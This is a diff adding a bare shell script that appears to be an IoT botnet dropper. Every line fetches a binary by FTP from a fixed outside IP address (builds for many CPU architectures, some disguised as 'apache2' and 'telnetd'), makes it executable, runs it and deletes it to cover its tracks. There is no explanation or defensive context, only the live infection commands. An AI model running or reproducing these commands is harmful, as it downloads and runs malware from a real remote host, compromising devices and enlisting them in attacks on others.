@@ -1,0 +1,13 @@
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 94.177.218.245 elfenliedmips elfenliedmips; chmod 777 elfenliedmips ./elfenliedmips; rm -rf elfenliedmips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 94.177.218.245 elfenliedmipsel elfenliedmipsel; chmod 777 elfenliedmipsel ./elfenliedmipsel; rm -rf elfenliedmipsel
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 94.177.218.245 elfenliedsh4 elfenliedsh4; chmod 777 elfenliedsh4 ./elfenliedsh4; rm -rf elfenliedsh4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 94.177.218.245 elfenliedx86 elfenliedx86; chmod 777 elfenliedx86 ./elfenliedx86; rm -rf elfenliedx86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 94.177.218.245 elfenliedarmv6l elfenliedarmv6l; chmod 777 elfenliedarmv6l ./elfenliedarmv6l; rm -rf elfenliedarmv6l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 94.177.218.245 elfenliedi686 elfenliedi686; chmod 777 elfenliedi686 ./elfenliedi686; rm -rf elfenliedi686
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 94.177.218.245 elfenliedppc elfenliedppc; chmod 777 elfenliedppc ./elfenliedppc; rm -rf elfenliedppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 94.177.218.245 elfenliedi586 elfenliedi586; chmod 777 elfenliedi586 ./elfenliedi586; rm -rf elfenliedi586
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 94.177.218.245 elfenliedm68k elfenliedm68k; chmod 777 elfenliedm68k ./elfenliedm68k; rm -rf elfenliedm68k
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 94.177.218.245 elfenliedsparc elfenliedsparc; chmod 777 elfenliedsparc ./elfenliedsparc; rm -rf elfenliedsparc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 94.177.218.245 ' ' ' '; chmod 777 ' ' ./' '; rm -rf ' '
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 94.177.218.245 apache2 apache2; chmod 777 apache2 ./apache2; rm -rf apache2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 94.177.218.245 telnetd telnetd; chmod 777 telnetd ./telnetd; rm -rf telnetd
